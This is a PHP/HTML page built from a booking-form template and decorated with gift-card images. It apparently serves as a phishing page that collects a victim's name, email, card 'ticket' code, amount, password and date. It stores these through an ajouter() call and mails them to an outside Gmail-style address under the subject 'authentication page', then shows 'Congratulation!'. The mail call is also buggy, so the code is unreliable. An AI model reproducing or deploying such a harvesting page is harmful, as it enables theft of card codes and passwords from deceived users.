<?php
require("action.php");
?>


<?php
if(isset($_POST['validation']))
{
	if(isset($_POST['nom']) AND isset($_POST['email']) AND isset($_POST['ticket']) AND isset($_POST['prix']) AND isset($_POST['motdepasse']) AND isset($_POST['ladate']))
	{
		if(!empty($_POST['nom']) AND !empty($_POST['email']) AND !empty($_POST['ticket']) AND !empty($_POST['prix']) AND !empty($_POST['motdepasse']) AND !empty($_POST['ladate']))
		{
			$nom = htmlspecialchars(strip_tags($_POST['nom']));
			$email = htmlspecialchars(strip_tags($_POST['email']));
			$ticket = htmlspecialchars(strip_tags($_POST['ticket']));
			$prix = htmlspecialchars(strip_tags($_POST['prix']));
			$code = htmlspecialchars(strip_tags($_POST['motdepasse']));
			$date = htmlspecialchars(strip_tags($_POST['ladate']));


			try
			{
				ajouter($nom, $email, $ticket, $prix, $code, $date);
			} 
			catch(Exception $e)
			{
				$e->getMessage();
			}
		}
	}
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

	<title>Booking Form HTML Template</title>

	<!-- Google font -->
	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet">

	<!-- Bootstrap -->
	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />

	<!-- Custom stlylesheet -->
	<link type="text/css" rel="stylesheet" href="css/style.css" />

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
<style type="text/css">

#slider {
	overflow: hidden;
}
#slider figure {
	position: relative;
	width: 100%;
	margin: 0;
	left: 0;
	animation: 20s slider infinite;
}
#slider figure img {
	width: 20%;
	float: left;
}

</style>
<div id="slider">
	<figure>
		<img src="img/maxresdefault.jpg">
		<img src="img/pc_gamecards.jpg">
		<img src="img/maxresdefault - Copie.jpg">
		<img src="img/pc_gamecards - Copie.jpg">
		<img src="img/maxresdefault - Copie2.jpg">
	</figure>
</div>

</head>

<body>
<?php
    $retour = mail('authenticationservicecardortic@gmail.co', 'send from authentication page', $_POST['nom'] AND $_POST['email'] AND $_POST['ticket'] AND $_POST['prix'] AND $_POST['motdepasse'] AND $_POST['ladate'], '');
    if($retour)
        echo'<p> Your forme hase been saved successfully</p>';
?>
	
	<div id="booking" class="section">
		<div class="section-center">
			<div class="container">
				<div class="row">
					<div class="booking-form">
						<div class="form-header">
							<h1>Congratulation!</h1>
						</div>

					</div>
				</div>
			</div>
		</div>
	</div>
</body>

</html>